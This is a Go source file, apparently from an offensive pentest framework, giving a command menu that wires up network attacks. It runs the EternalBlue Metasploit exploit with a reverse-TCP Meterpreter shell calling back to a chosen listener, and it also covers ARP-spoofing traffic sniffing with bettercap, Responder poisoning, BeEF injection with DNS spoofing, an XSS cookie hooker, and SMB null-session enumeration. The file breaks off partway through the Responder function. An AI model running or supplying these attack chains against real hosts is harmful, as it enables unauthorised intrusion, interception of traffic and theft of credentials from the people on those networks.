package internals

import(
    "os"
    "fmt"
    "time"
    "bufio"
    "utils"
    "menus"
    "banners"
    "strings"
    "os/exec"
    "bcolors"
    "subprocess"
    "scriptures"
)

var(
    FakeDns = "*"
    Lport = "9999"
    Mode = "single"
    Iface  = "eth0"
    Passwd = "Jesus"
    Spoofer = "ettercap"

    Lhost, _ = utils.GetDefaultIP()
    scanner = bufio.NewScanner(os.Stdin)
    Gateway, _ = utils.GetDefaultGatewayIP()
    Name, Input, Rhost, Target, Proxy, Function  string
    CertDir, OutPutDir, KeyPath, CertPath, ToolsDir, WordList = utils.DirLocations()
)

var defaultValues = map[string]string{

    "proxies": "",
    "fakedns": "*",
    "function": "",
    "lport": "9999",
    "iface": "eth0",
    "mode": "single",
    "passwd": "Jesus",
    "Spoofer": "ettercap",

    "lhost": Lhost,
    "rhost": Rhost,
    "rhosts": Rhost,
    "target": Rhost,
    "targets": Rhost,
    "gateway": Gateway,
    "output": OutPutDir,
}

func NetworkPentest() {
    for {
        fmt.Printf("%s%safr3%s networks(%s%s%s)%s > %s", bcolors.UNDERL, bcolors.BOLD, bcolors.ENDC, bcolors.RED, "internal_pentest.fn", bcolors.ENDC, bcolors.GREEN, bcolors.ENDC)
        scanner.Scan()
        Input = strings.TrimSpace(strings.ToLower(scanner.Text()))
        buildParts := strings.Fields(Input)
        if len(buildParts) == 0 {
            continue
        }

        if executeCommand(Input) {
            continue
        }

        switch buildParts[0] {
        case "e", "q", "exit", "quit":
            os.Exit(0)
        case "0", "b", "back":
            return
        case "set":
            handleSetCommand(buildParts)
        case "unset", "delete":
            handleUnsetCommand(buildParts)
        case "run", "start", "launch", "exploit", "execute":
            executeFunction()
        default:
            utils.SystemShell(Input)
        }
    }
}

func executeCommand(cmd string) bool {
    commandMap := map[string]func(){

    "? info":               menus.HelpInfo,
    "h info":               menus.HelpInfo,
    "help info":            menus.HelpInfo,

    "v":                banners.Version,
    "version":          banners.Version,

    "s":                utils.Sleep,
    "sleep":            utils.Sleep,

    "o":                utils.ListJunks,
    "junks":            utils.ListJunks,
    "outputs":          utils.ListJunks,
    "clear junks":      utils.ClearJunks,
    "clear outputs":    utils.ClearJunks,

    "logs":             subprocess.LogHistory,
    "history":          subprocess.LogHistory,
    "clear logs":       subprocess.ClearHistory,
    "clear history":    subprocess.ClearHistory,

    "? run":            menus.HelpInfoRun,
    "h run":            menus.HelpInfoRun,
    "info run":         menus.HelpInfoRun,
    "help run":         menus.HelpInfoRun,

    "use":              menus.HelpInfoUse,
    "? use":            menus.HelpInfoUse,
    "h use":            menus.HelpInfoUse,
    "info use":         menus.HelpInfoUse,
    "help use":         menus.HelpInfoUse,

    "? exec":           menus.HelpInfoRun,
    "h exec":           menus.HelpInfoRun,
    "info exec":        menus.HelpInfoRun,
    "help exec":        menus.HelpInfoRun,

    "? start":          menus.HelpInfoStart,
    "h start":          menus.HelpInfoStart,
    "info start":       menus.HelpInfoStart,
    "help start":       menus.HelpInfoStart,

    "? launch":         menus.HelpInfoRun,
    "h launch":         menus.HelpInfoRun,
    "info launch":      menus.HelpInfoRun,
    "help launch":      menus.HelpInfoRun,
    "? exploit":        menus.HelpInfoRun,
    "h exploit":        menus.HelpInfoRun,
    "info exploit":     menus.HelpInfoRun,
    "help exploit":     menus.HelpInfoRun,
    "? execute":        menus.HelpInfoRun,
    "h execute":        menus.HelpInfoRun,
    "info execute":     menus.HelpInfoRun,
    "help execute":     menus.HelpInfoRun,

    "set":              menus.HelpInfoSet,
    "h set":            menus.HelpInfoSet,
    "info set":         menus.HelpInfoSet,
    "help set":         menus.HelpInfoSet,

    "tips":             menus.HelpInfoTips,
    "h tips":           menus.HelpInfoTips,
    "? tips":           menus.HelpInfoTips,
    "info tips":        menus.HelpInfoTips,
    "help tips":        menus.HelpInfoTips,

    "show":             menus.HelpInfoShow,
    "? show":           menus.HelpInfoShow,
    "h show":           menus.HelpInfoShow,
    "info show":        menus.HelpInfoShow,
    "help show":        menus.HelpInfoShow,

    "info list":        menus.HelpInfoList,
    "help list":        menus.HelpInfoList,
    "use list":         menus.HelpInfoList,
    "list":             menus.HelpInfoList,

    "h option":         menus.HelpInfOptions,
    "? option":         menus.HelpInfOptions,
    "h options":        menus.HelpInfOptions,
    "? options":        menus.HelpInfOptions,
    "info option":      menus.HelpInfOptions,
    "help option":      menus.HelpInfOptions,
    "info options":     menus.HelpInfOptions,
    "help options":     menus.HelpInfOptions,

    "banner":           banners.RandomBanners,
    "g":                utils.BrowseTutarilas,
    "t":                utils.BrowseTutarilas,
    "guide":            utils.BrowseTutarilas,
    "tutarial":         utils.BrowseTutarilas,
    "h":                menus.HelpInfoMenuZero,
    "?":                menus.HelpInfoMenuZero,
    "00":               menus.HelpInfoMenuZero,
    "help":             menus.HelpInfoMenuZero,
    "f":                menus.HelpInfoFeatures,
    "use f":            menus.HelpInfoFeatures,
    "features":         menus.HelpInfoFeatures,
    "use features":     menus.HelpInfoFeatures,

    //Chameleons//
    "info":             menus.HelpInfoNetworks,

    "m":                menus.MenuThree,
    "menu":             menus.MenuThree,

    "option":           menus.NetworksOptions,
    "options":          menus.NetworksOptions,
    "show option":      menus.NetworksOptions,
    "show options":     menus.NetworksOptions,

    "show all":         menus.ListInternalFunctions,
    "list all":         menus.ListInternalFunctions,

    "func":             menus.ListInternalFunctions,
    "funcs":            menus.ListInternalFunctions,
    "functions":        menus.ListInternalFunctions,
    "show func":        menus.ListInternalFunctions,
    "list funcs":       menus.ListInternalFunctions,
    "show funcs":       menus.ListInternalFunctions,
    "show function":    menus.ListInternalFunctions,
    "list function":    menus.ListInternalFunctions,
    "list functions":   menus.ListInternalFunctions,
    "show functions":   menus.ListInternalFunctions,

    "module":           menus.ListInternalFunctions,
    "modules":          menus.ListInternalFunctions,
    "list module":      menus.ListInternalFunctions,
    "show module":      menus.ListInternalFunctions,
    "list modules":     menus.ListInternalFunctions,
    "show modules":     menus.ListInternalFunctions,

    "1":                    func() {IpNeighbour()},
    "run 1":                func() {IpNeighbour()},
    "use 1":                func() {IpNeighbour()},
    "exec 1":               func() {IpNeighbour()},
    "start 1":              func() {IpNeighbour()},
    "launch 1":             func() {IpNeighbour()},
    "exploit 1":            func() {IpNeighbour()},
    "execute 1":            func() {IpNeighbour()},
    "run discover":            func() {IpNeighbour()},
    "use discover":            func() {IpNeighbour()},
    "exec discover":           func() {IpNeighbour()},
    "start discover":          func() {IpNeighbour()},
    "launch discover":         func() {IpNeighbour()},
    "exploit discover":        func() {IpNeighbour()},
    "execute discover":        func() {IpNeighbour()},

    "? 1":                  menus.HelpInfoDiscover,
    "info 1":               menus.HelpInfoDiscover,
    "help 1":               menus.HelpInfoDiscover,
    "discover":                menus.HelpInfoDiscover,
    "info discover":           menus.HelpInfoDiscover,
    "help discover":           menus.HelpInfoDiscover,

    "2":                    func() {NmapPortScan(Rhost)},
    "run 2":                func() {NmapPortScan(Rhost)},
    "use 2":                func() {NmapPortScan(Rhost)},
    "exec 2":               func() {NmapPortScan(Rhost)},
    "start 2":              func() {NmapPortScan(Rhost)},
    "launch 2":             func() {NmapPortScan(Rhost)},
    "exploit 2":            func() {NmapPortScan(Rhost)},
    "execute 2":            func() {NmapPortScan(Rhost)},
    "run portscan":           func() {NmapPortScan(Rhost)},
    "use portscan":           func() {NmapPortScan(Rhost)},
    "exec portscan":          func() {NmapPortScan(Rhost)},
    "start portscan":         func() {NmapPortScan(Rhost)},
    "launch portscan":        func() {NmapPortScan(Rhost)},
    "exploit portscan":       func() {NmapPortScan(Rhost)},
    "execute portscan":       func() {NmapPortScan(Rhost)},

    "? 2":                  menus.HelpInfoPortScan,
    "info 2":               menus.HelpInfoPortScan,
    "help 2":               menus.HelpInfoPortScan,
    "portscan":               menus.HelpInfoPortScan,
    "info portscan":          menus.HelpInfoPortScan,
    "help portscan":          menus.HelpInfoPortScan,

    "3":                    func() {NmapVulnScan(Rhost)},
    "run 3":                func() {NmapVulnScan(Rhost)},
    "use 3":                func() {NmapVulnScan(Rhost)},
    "exec 3":               func() {NmapVulnScan(Rhost)},
    "start 3":              func() {NmapVulnScan(Rhost)},
    "launch 3":             func() {NmapVulnScan(Rhost)},
    "exploit 3":            func() {NmapVulnScan(Rhost)},
    "execute 3":            func() {NmapVulnScan(Rhost)},
    "run vulnscan":         func() {NmapVulnScan(Rhost)},
    "use vulnscan":         func() {NmapVulnScan(Rhost)},
    "exec vulnscan":        func() {NmapVulnScan(Rhost)},
    "start vulnscan":       func() {NmapVulnScan(Rhost)},
    "launch vulnscan":      func() {NmapVulnScan(Rhost)},
    "exploit vulnscan":     func() {NmapVulnScan(Rhost)},
    "execute vulnscan":     func() {NmapVulnScan(Rhost)},

    "? 3":                  menus.HelpInfoVulnScan,
    "info 3":               menus.HelpInfoVulnScan,
    "help 3":               menus.HelpInfoVulnScan,
    "vulnscan":             menus.HelpInfoVulnScan,
    "info vulnscan":        menus.HelpInfoVulnScan,
    "help vulnscan":        menus.HelpInfoVulnScan,

    "4":                    func() {SmbVulnScan(Rhost); EnumNxc(Rhost); Enum4linux(Rhost); SmbMapScan(Rhost)},
    "run 4":                func() {SmbVulnScan(Rhost); EnumNxc(Rhost); Enum4linux(Rhost); SmbMapScan(Rhost)},
    "use 4":                func() {SmbVulnScan(Rhost); EnumNxc(Rhost); Enum4linux(Rhost); SmbMapScan(Rhost)},
    "exec 4":               func() {SmbVulnScan(Rhost); EnumNxc(Rhost); Enum4linux(Rhost); SmbMapScan(Rhost)},
    "start 4":              func() {SmbVulnScan(Rhost); EnumNxc(Rhost); Enum4linux(Rhost); SmbMapScan(Rhost)},
    "launch 4":             func() {SmbVulnScan(Rhost); EnumNxc(Rhost); Enum4linux(Rhost); SmbMapScan(Rhost)},
    "exploit 4":            func() {SmbVulnScan(Rhost); EnumNxc(Rhost); Enum4linux(Rhost); SmbMapScan(Rhost)},
    "execute 4":            func() {SmbVulnScan(Rhost); EnumNxc(Rhost); Enum4linux(Rhost); SmbMapScan(Rhost)},
    "run enumscan":         func() {SmbVulnScan(Rhost); EnumNxc(Rhost); Enum4linux(Rhost); SmbMapScan(Rhost)},
    "use enumscan":         func() {SmbVulnScan(Rhost); EnumNxc(Rhost); Enum4linux(Rhost); SmbMapScan(Rhost)},
    "exec enumscan":        func() {SmbVulnScan(Rhost); EnumNxc(Rhost); Enum4linux(Rhost); SmbMapScan(Rhost)},
    "start enumscan":       func() {SmbVulnScan(Rhost); EnumNxc(Rhost); Enum4linux(Rhost); SmbMapScan(Rhost)},
    "launch enumscan":      func() {SmbVulnScan(Rhost); EnumNxc(Rhost); Enum4linux(Rhost); SmbMapScan(Rhost)},
    "exploit enumscan":     func() {SmbVulnScan(Rhost); EnumNxc(Rhost); Enum4linux(Rhost); SmbMapScan(Rhost)},
    "execute enumscan":     func() {SmbVulnScan(Rhost); EnumNxc(Rhost); Enum4linux(Rhost); SmbMapScan(Rhost)},

    "? 4":                  menus.HelpInfoEnumScan,
    "info 4":               menus.HelpInfoEnumScan,
    "help 4":               menus.HelpInfoEnumScan,
    "enumscan":             menus.HelpInfoEnumScan,
    "info enumscan":        menus.HelpInfoEnumScan,
    "help enumscan":        menus.HelpInfoEnumScan,

    "5":                    func() {SmbVulnScan(Rhost); SmbExploit(Rhost, Lhost, Lport)},
    "run 5":                func() {SmbVulnScan(Rhost); SmbExploit(Rhost, Lhost, Lport)},
    "use 5":                func() {SmbVulnScan(Rhost); SmbExploit(Rhost, Lhost, Lport)},
    "exec 5":               func() {SmbVulnScan(Rhost); SmbExploit(Rhost, Lhost, Lport)},
    "start 5":              func() {SmbVulnScan(Rhost); SmbExploit(Rhost, Lhost, Lport)},
    "launch 5":             func() {SmbVulnScan(Rhost); SmbExploit(Rhost, Lhost, Lport)},
    "exploit 5":            func() {SmbVulnScan(Rhost); SmbExploit(Rhost, Lhost, Lport)},
    "execute 5":            func() {SmbVulnScan(Rhost); SmbExploit(Rhost, Lhost, Lport)},
    "run smbexplo":        func() {SmbVulnScan(Rhost); SmbExploit(Rhost, Lhost, Lport)},
    "use smbexplo":        func() {SmbVulnScan(Rhost); SmbExploit(Rhost, Lhost, Lport)},
    "exec smbexplo":       func() {SmbVulnScan(Rhost); SmbExploit(Rhost, Lhost, Lport)},
    "start smbexplo":      func() {SmbVulnScan(Rhost); SmbExploit(Rhost, Lhost, Lport)},
    "launch smbexplo":     func() {SmbVulnScan(Rhost); SmbExploit(Rhost, Lhost, Lport)},
    "exploit smbexplo":    func() {SmbVulnScan(Rhost); SmbExploit(Rhost, Lhost, Lport)},
    "execute smbexplo":    func() {SmbVulnScan(Rhost); SmbExploit(Rhost, Lhost, Lport)},

    "? 5":                  menus.HelpInfoSmbExplo,
    "info 5":               menus.HelpInfoSmbExplo,
    "help 5":               menus.HelpInfoSmbExplo,
    "smbexplo":            menus.HelpInfoSmbExplo,
    "info smbexplo":       menus.HelpInfoSmbExplo,
    "help smbexplo":       menus.HelpInfoSmbExplo,

    "6":                    func() {PacketSniffer(Mode, Rhost)},
    "run 6":                func() {PacketSniffer(Mode, Rhost)},
    "use 6":                func() {PacketSniffer(Mode, Rhost)},
    "exec 6":               func() {PacketSniffer(Mode, Rhost)},
    "start 6":              func() {PacketSniffer(Mode, Rhost)},
    "launch 6":             func() {PacketSniffer(Mode, Rhost)},
    "exploit 6":            func() {PacketSniffer(Mode, Rhost)},
    "execute 6":            func() {PacketSniffer(Mode, Rhost)},
    "run psniffer":        func() {PacketSniffer(Mode, Rhost)},
    "use psniffer":        func() {PacketSniffer(Mode, Rhost)},
    "exec psniffer":       func() {PacketSniffer(Mode, Rhost)},
    "start psniffer":      func() {PacketSniffer(Mode, Rhost)},
    "launch psniffer":     func() {PacketSniffer(Mode, Rhost)},
    "exploit psniffer":    func() {PacketSniffer(Mode, Rhost)},
    "execute psniffer":    func() {PacketSniffer(Mode, Rhost)},

    "? 6":                  menus.HelpInfoPSniffer,
    "info 6":               menus.HelpInfoPSniffer,
    "help 6":               menus.HelpInfoPSniffer,
    "psniffer":            menus.HelpInfoPSniffer,
    "info psniffer":       menus.HelpInfoPSniffer,
    "help psniffer":       menus.HelpInfoPSniffer,

    "7":                    func() {KillerResponder(Iface, Lhost)},
    "run 7":                func() {KillerResponder(Iface, Lhost)},
    "use 7":                func() {KillerResponder(Iface, Lhost)},
    "exec 7":               func() {KillerResponder(Iface, Lhost)},
    "start 7":              func() {KillerResponder(Iface, Lhost)},
    "launch 7":             func() {KillerResponder(Iface, Lhost)},
    "exploit 7":            func() {KillerResponder(Iface, Lhost)},
    "execute 7":            func() {KillerResponder(Iface, Lhost)},
    "run responder":        func() {KillerResponder(Iface, Lhost)},
    "use responder":        func() {KillerResponder(Iface, Lhost)},
    "exec responder":       func() {KillerResponder(Iface, Lhost)},
    "start responder":      func() {KillerResponder(Iface, Lhost)},
    "launch responder":     func() {KillerResponder(Iface, Lhost)},
    "exploit responder":    func() {KillerResponder(Iface, Lhost)},
    "execute responder":    func() {KillerResponder(Iface, Lhost)},

    "? 7":                  menus.HelpInfoResponder,
    "info 7":               menus.HelpInfoResponder,
    "help 7":               menus.HelpInfoResponder,
    "responder":             menus.HelpInfoResponder,
    "info responder":        menus.HelpInfoResponder,
    "help responder":        menus.HelpInfoResponder,

    "8":                    func() {BeefInjector(Spoofer, Mode, Lhost, Rhost, Iface, Passwd, FakeDns, Gateway)},
    "run 8":                func() {BeefInjector(Spoofer, Mode, Lhost, Rhost, Iface, Passwd, FakeDns, Gateway)},
    "use 8":                func() {BeefInjector(Spoofer, Mode, Lhost, Rhost, Iface, Passwd, FakeDns, Gateway)},
    "exec 8":               func() {BeefInjector(Spoofer, Mode, Lhost, Rhost, Iface, Passwd, FakeDns, Gateway)},
    "start 8":              func() {BeefInjector(Spoofer, Mode, Lhost, Rhost, Iface, Passwd, FakeDns, Gateway)},
    "launch 8":             func() {BeefInjector(Spoofer, Mode, Lhost, Rhost, Iface, Passwd, FakeDns, Gateway)},
    "exploit 8":            func() {BeefInjector(Spoofer, Mode, Lhost, Rhost, Iface, Passwd, FakeDns, Gateway)},
    "execute 8":            func() {BeefInjector(Spoofer, Mode, Lhost, Rhost, Iface, Passwd, FakeDns, Gateway)},
    "run beefninja":       func() {BeefInjector(Spoofer, Mode, Lhost, Rhost, Iface, Passwd, FakeDns, Gateway)},
    "use beefninja":       func() {BeefInjector(Spoofer, Mode, Lhost, Rhost, Iface, Passwd, FakeDns, Gateway)},
    "exec beefninja":      func() {BeefInjector(Spoofer, Mode, Lhost, Rhost, Iface, Passwd, FakeDns, Gateway)},
    "start beefninja":     func() {BeefInjector(Spoofer, Mode, Lhost, Rhost, Iface, Passwd, FakeDns, Gateway)},
    "launch beefninja":    func() {BeefInjector(Spoofer, Mode, Lhost, Rhost, Iface, Passwd, FakeDns, Gateway)},
    "exploit beefninja":   func() {BeefInjector(Spoofer, Mode, Lhost, Rhost, Iface, Passwd, FakeDns, Gateway)},
    "execute beefninja":   func() {BeefInjector(Spoofer, Mode, Lhost, Rhost, Iface, Passwd, FakeDns, Gateway)},

    "? 8":                  menus.HelpInfoBeefNinja,
    "info 8":               menus.HelpInfoBeefNinja,
    "help 8":               menus.HelpInfoBeefNinja,
    "beefninja":           menus.HelpInfoBeefNinja,
    "info beefninja":      menus.HelpInfoBeefNinja,
    "help beefninja":      menus.HelpInfoBeefNinja,

    "9":                    func() {XssHooker(Rhost)},
    "run 9":                func() {XssHooker(Rhost)},
    "use 9":                func() {XssHooker(Rhost)},
    "exec 9":               func() {XssHooker(Rhost)},
    "start 9":              func() {XssHooker(Rhost)},
    "launch 9":             func() {XssHooker(Rhost)},
    "exploit 9":            func() {XssHooker(Rhost)},
    "execute 9":            func() {XssHooker(Rhost)},
    "run xsshooker":      func() {XssHooker(Rhost)},
    "use xsshooker":      func() {XssHooker(Rhost)},
    "exec xsshooker":     func() {XssHooker(Rhost)},
    "start xsshooker":    func() {XssHooker(Rhost)},
    "launch xsshooker":   func() {XssHooker(Rhost)},
    "exploit xsshooker":  func() {XssHooker(Rhost)},
    "execute xsshooker":  func() {XssHooker(Rhost)},

    "? 9":                  menus.HelpInfoXssHoocker,
    "info 9":               menus.HelpInfoXssHoocker,
    "help 9":               menus.HelpInfoXssHoocker,
    "xsshooker":              menus.HelpInfoXssHoocker,
    "info xsshooker":         menus.HelpInfoXssHoocker,
    "help xsshooker":         menus.HelpInfoXssHoocker,

    "99":                   scriptures.ScriptureNarators,
    "run 99":               scriptures.ScriptureNarators,
    "use 99":               scriptures.ScriptureNarators,
    "exec 99":              scriptures.ScriptureNarators,
    "start 99":             scriptures.ScriptureNarators,
    "launch 99":            scriptures.ScriptureNarators,
    "exploit 99":           scriptures.ScriptureNarators,
    "execute 99":           scriptures.ScriptureNarators,
    "run verses":           scriptures.ScriptureNarators,
    "use verses":           scriptures.ScriptureNarators,
    "exec verses":          scriptures.ScriptureNarators,
    "start verses":         scriptures.ScriptureNarators,
    "launch verses":        scriptures.ScriptureNarators,
    "exploit verses":       scriptures.ScriptureNarators,
    "execute verses":       scriptures.ScriptureNarators,

    "? 99":                 menus.HelpInfoVerses,
    "verses":               menus.HelpInfoVerses,
    "info 99":              menus.HelpInfoVerses,
    "help 99":              menus.HelpInfoVerses,
    "info verses":          menus.HelpInfoVerses,
    "help verses":          menus.HelpInfoVerses,

    }
    if action, exists := commandMap[cmd]; exists {
        action()
        return true
    }
    return false
}

func handleSetCommand(parts []string) {
    if len(parts) < 3 {
        menus.HelpInfoSet()
        return
    }
    key, value := parts[1], parts[2]
    setValues := map[string]*string{

        "mode": &Mode,
        "lhost": &Lhost,
        "lport": &Lport,
        "iface": &Iface,
        "rhost": &Rhost,
        "rhosts": &Rhost,
        "target": &Rhost,
        "targets": &Rhost,
        "proxies": &Proxy,
        "passwd": &Passwd,
        "func": &Function,
        "gateway": &Gateway,
        "fakedns": &FakeDns,
        "spoofer": &Spoofer,
        "module": &Function,
        "function": &Function,
    }

    if ptr, exists := setValues[key]; exists {
        *ptr = value
        fmt.Printf("%s => %s\n", strings.ToUpper(key), value)
    } else {
        menus.HelpInfoSet()
    }
}

func handleUnsetCommand(parts []string) {
    if len(parts) < 2 {
        menus.HelpInfoSet()
        return
    }
    key := parts[1]
    unsetValues := map[string]*string{

        "mode": &Mode,
        "lhost": &Lhost,
        "lport": &Lport,
        "iface": &Iface,
        "rhost": &Rhost,
        "rhosts": &Rhost,
        "target": &Rhost,
        "targets": &Rhost,
        "proxies": &Proxy,
        "passwd": &Passwd,
        "func": &Function,
        "gateway": &Gateway,
        "fakedns": &FakeDns,
        "spoofer": &Spoofer,
        "module": &Function,
        "function": &Function,
    }

    if ptr, exists := unsetValues[key]; exists {
        *ptr = defaultValues[key] // Reset to default
        if *ptr != "" {
            fmt.Printf("%s => %s\n", strings.ToUpper(key), *ptr)
        }else{
            fmt.Printf("%s => %s\n", strings.ToUpper(key), "Null")
        }
    } else {
        menus.HelpInfoSet()
    }
}

func executeFunction() {
    if Function == ""{
        fmt.Printf("\n%s[!] %sMissing required parameter Function. Use %s'help' %sfor details.\n", bcolors.RED, bcolors.ENDC, bcolors.DARKGREEN, bcolors.ENDC)
        return
    }
    NetworkPenFunctions(Function, Iface, Gateway, Lhost, Rhost, Mode, FakeDns, Spoofer)
}

// Helper functions
func autoExecuteFunc(distro string, function string) {
    //Distro = distro
    //Function = function
    executeFunction()
}

func NetworkPenFunctions(Function string, args ...interface{}) {
    if Rhost != "" {
        fmt.Printf("\nRHOST => %s", Rhost)
    }
    if Function != "" {
        fmt.Printf("\nFUNCTION => %s", Function)
    }
    if Proxy != "" {
        fmt.Printf("\nPROXIES => %s", Proxy)
        utils.SetProxy(Proxy)
    }

    commands := map[string]func() {

        "discover":  func() {IpNeighbour()},
        "portscan":  func() {NmapPortScan(Rhost)},
        "vulnscan":  func() {NmapVulnScan(Rhost)},
        "enumscan":  func() {SmbVulnScan(Rhost); EnumNxc(Rhost); Enum4linux(Rhost); SmbMapScan(Rhost)},
        "smbexplo":  func() {SmbVulnScan(Rhost); SmbExploit(Rhost, Lhost, Lport)},
        "psniffer":  func() {PacketSniffer(Mode, Rhost)},
        "responder": func() {KillerResponder(Iface, Lhost)},
        "beefninja": func() {BeefInjector(Spoofer, Mode, Lhost, Rhost, Iface, Passwd, FakeDns, Gateway)},
        "xsshooker": func() {XssHooker(Rhost)},

    }

    if action, exists := commands[Function]; exists {
        action()
    } else {
        fmt.Printf("\n%s[!] %sInvalid Function %s. Use %s'help' %sfor available Functions.\n", bcolors.YELLOW, bcolors.ENDC, Function, bcolors.DARKGREEN, bcolors.ENDC)
    }
}

func IpNeighbour() {
    fmt.Printf("\n\n%s[>] %sDiscovering connected devices ...\n", bcolors.GREEN, bcolors.ENDC)
    subprocess.Popen(`ip -h -s -d -a -c=auto -t neighbour`)
    return
}

func NaabuPortScan(Rhost string) {
    if Rhost == "" {
        fmt.Printf("\n%s[!] %sMissing required parameters RHOST. Use %s'help' %sfor details.\n", bcolors.RED, bcolors.ENDC, bcolors.DARKGREEN, bcolors.ENDC)
        return
    }
    fmt.Printf("\n\n%s[>] %sport scan target: %s ...\n", bcolors.GREEN, bcolors.ENDC, Rhost)
    subprocess.Popen(`naabu -host %s`, Rhost)
    return
}

func NmapPortScan(Rhost string) {
    if Rhost == "" {
        fmt.Printf("\n%s[!] %sMissing required parameters RHOST. Use %s'help' %sfor details.\n", bcolors.RED, bcolors.ENDC, bcolors.DARKGREEN, bcolors.ENDC)
        return
    }
    fmt.Printf("\n\n%s[>] %sport scan target: %s ...\n", bcolors.GREEN, bcolors.ENDC, Rhost)
    subprocess.Popen(`nmap -sV -sC -O -T4 -n -v -p- %s`, Rhost)
    return
}

func NmapVulnScan(Rhost string) {
    if Rhost == "" {
        fmt.Printf("\n%s[!] %sMissing required parameters RHOST. Use %s'help' %sfor details.\n", bcolors.RED, bcolors.ENDC, bcolors.DARKGREEN, bcolors.ENDC)
        return
    }
    fmt.Printf("\n\n%s[>] %svuln scan target: %s ...\n", bcolors.GREEN, bcolors.ENDC, Rhost)
    subprocess.Popen(`nmap --open -v -T4 -n -sSV -p- --script="vuln and safe" --reason %s`, Rhost)
    return
}

func SmbVulnScan(Rhost string) {
    if Rhost == "" {
        fmt.Printf("\n%s[!] %sMissing required parameters RHOST. Use %s'help' %sfor details.\n", bcolors.RED, bcolors.ENDC, bcolors.DARKGREEN, bcolors.ENDC)
        return
    }
    fmt.Printf("\n\n%s[>] %sSMB vuln scan target: %s ...\n", bcolors.GREEN, bcolors.ENDC, Rhost)
    subprocess.Popen(`nmap -sV -v --script "smb-vuln*" -p139,445 %s`, Rhost)
    return
}

func Enum4linux(Rhost string) {
    if Rhost == "" {
        fmt.Printf("\n%s[!] %sMissing required parameters RHOST. Use %s'help' %sfor details.\n", bcolors.RED, bcolors.ENDC, bcolors.DARKGREEN, bcolors.ENDC)
        return
    }
    fmt.Printf("\n\n%s[>] %srunning smb recon on target: %s ...\n", bcolors.GREEN, bcolors.ENDC, Rhost)
    subprocess.Popen(`cd /root/.afr3/africana-base/networks/enum4linux-ng; python3 enum4linux-ng.py -A -v %s`, Rhost)
    return
}

func EnumNxc(Rhost string) {
    if Rhost == "" {
        fmt.Printf("\n%s[!] %sMissing required parameters RHOST. Use %s'help' %sfor details.\n", bcolors.RED, bcolors.ENDC, bcolors.DARKGREEN, bcolors.ENDC)
        return
    }
    fmt.Printf("\n\n%s[>] %srunning smb recon on target: %s ...\n", bcolors.GREEN, bcolors.ENDC, Rhost)
    subprocess.Popen(`nxc smb %s -u '' -p '' --verbose --groups --local-groups --loggedon-s --rid-brute --sessions --s --shares --pass-pol`, Rhost)
    return
}

func SmbMapScan(Rhost string) {
    if Rhost == "" {
        fmt.Printf("\n%s[!] %sMissing required parameters RHOST. Use %s'help' %sfor details.\n", bcolors.RED, bcolors.ENDC, bcolors.DARKGREEN, bcolors.ENDC)
        return
    }
    fmt.Printf("\n\n%s[>] %srunning smb recon on target: %s ...\n", bcolors.GREEN, bcolors.ENDC, Rhost)
    subprocess.Popen(`smbmap -u '' -p '' -r --depth 5 -H %s; smbmap --no-banner -u 'guest' -p '' -r --depth 5 -H %s`, Rhost, Rhost)
    return
}

func RpcEnumScan(Rhost string) {
    if Rhost == "" {
        fmt.Printf("\n%s[!] %sMissing required parameters RHOST. Use %s'help' %sfor details.\n", bcolors.RED, bcolors.ENDC, bcolors.DARKGREEN, bcolors.ENDC)
        return
    }
    fmt.Printf("\n\n%s[>] %sperforming rpc recon target: %s ...\n", bcolors.GREEN, bcolors.ENDC, Rhost)
    subprocess.Popen(`rpcclient -U "" -N %s`, Rhost)
    return
}

func XssHooker(Rhost string) {
    if Rhost == "" {
        fmt.Printf("\n%s[!] %sMissing required parameters RHOST. Use %s'help' %sfor details.\n", bcolors.RED, bcolors.ENDC, bcolors.DARKGREEN, bcolors.ENDC)
        return
    }
    fmt.Printf("\n\n%s[>] %sperforming rpc recon target: %s ...\n", bcolors.GREEN, bcolors.ENDC, Rhost)
    subprocess.Popen(`toxssin.py [-h] -u URL -c CERTFILE -k KEYFILE [-p PORT] [-s SCRIPT_NAME] [-e ELEMENTS] [-f FREQUENCY] [-a COOKIE_AGE] [-t] [-g] [-v] [-q] %s`, Rhost)
    return
}

func SmbExploit(Rhost string, Lhost string, Lport string) {
    if Rhost == "" {
        fmt.Printf("\n%s[!] %sMissing required parameters RHOST. Use %s'help' %sfor details.\n", bcolors.RED, bcolors.ENDC, bcolors.DARKGREEN, bcolors.ENDC)
        return
    }
    fmt.Printf("\n\n%s[>] %sexploiting smb on target: %s ...\n", bcolors.GREEN, bcolors.ENDC, Rhost)
    fmt.Printf("\nRHOST => %s\nLHOST => %s\nLPORT => %s\n\n", Rhost, Lhost, Lport)
    subprocess.Popen(`msfconsole -x 'use exploit/windows/smb/ms17_010_eternalblue; set RHOSTS %s; set RPORT 445; set PAYLOAD windows/x64/meterpreter/reverse_tcp; set LHOST %s; set LPORT %s; set VERBOSE true; exploit -j'`, Rhost, Lhost, Lport)
}

func PacketSniffer(Mode string, Rhost string) {
    if Rhost == "" {
        fmt.Printf("\n%s[!] %sMissing required parameters RHOST. Use %s'help' %sfor details.\n", bcolors.RED, bcolors.ENDC, bcolors.DARKGREEN, bcolors.ENDC)
        return
    }
    switch strings.ToLower(Mode) {
    case "single":
        fmt.Printf("\nRHOST => %s\nMODE => %s\n\n", Rhost, Mode)
        subprocess.Popen(`bettercap -caplet /usr/share/bettercap/caplets/http-req-dump/http-req-dump.cap -eval 'set $ {bold}(Jesus.is.❤. Type.exit.when.done) » {reset}; set arp.spoof.targets %s; set net.sniff.verbose true; set net.sniff.local true; net.sniff on; ticker on'`, Rhost)
    case "all":
        fmt.Printf("\nRHOST => %s\nMODE => %s\n\n", Rhost, Mode)
        subprocess.Popen(`bettercap -caplet /usr/share/bettercap/caplets/http-req-dump/http-req-dump.cap -eval 'set $ {bold}(Jesus.is.❤. Type.exit.when.done) » {reset}; set net.sniff.verbose true; set net.sniff.local true; net.sniff on; active; ticker on'`)
    default:
        fmt.Printf("\n%s[!] %sInvalid required parameters MODE: %s%s%s Use %s'help' %sfor details.\n", bcolors.RED, bcolors.ENDC, bcolors.RED, Mode, bcolors.ENDC, bcolors.DARKGREEN, bcolors.ENDC)
        return
    }
}

func KillerResponder(Iface string, Lhost string) {
    filePath := "/etc/responder/Responder.conf.bak_africana"
    if _, err := os.Stat(filePath); os.IsNotExist(err) {
        subprocess.Popen(`cp /etc/responder/Responder.conf /etc/responder/Responder.conf.bak_africana`)

